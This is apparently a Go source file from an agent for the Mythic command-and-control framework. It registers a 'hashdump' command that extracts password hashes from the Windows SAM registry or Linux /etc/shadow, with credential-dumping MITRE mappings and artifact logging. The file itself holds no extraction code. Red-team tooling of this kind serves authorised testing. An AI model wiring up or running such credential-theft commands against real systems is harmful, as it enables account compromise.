package agentfunctions

import (
	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "hashdump",
		Description:         "Extract local account password hashes. Windows: NTLM hashes from SAM registry (requires SYSTEM). Linux: hashes from /etc/shadow (requires root).",
		HelpString:          "hashdump [-format json]",
		Version:             2,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1003.002", "T1003.008"}, // SAM + /etc/passwd
		SupportedUIFeatures: []string{},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:          "format",
				CLIName:       "format",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:   "Output format (Linux only)",
				DefaultValue:  "text",
				Choices:       []string{"text", "json"},
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			return nil
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return nil
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			if taskData.Payload.OS == "Linux" {
				display := "/etc/shadow dump"
				response.DisplayParams = &display
				mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
					TaskID:           taskData.Task.ID,
					BaseArtifactType: "FileOpen",
					ArtifactMessage:  "Read /etc/shadow + /etc/passwd (hash extraction)",
				})
			} else {
				display := "SAM Dump"
				response.DisplayParams = &display
				mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
					TaskID:           taskData.Task.ID,
					BaseArtifactType: "API Call",
					ArtifactMessage:  "RegOpenKeyExW + RegQueryValueExW on SAM\\SAM\\Domains\\Account (NTLM hash extraction)",
				})
			}
			return response
		},
	})
}
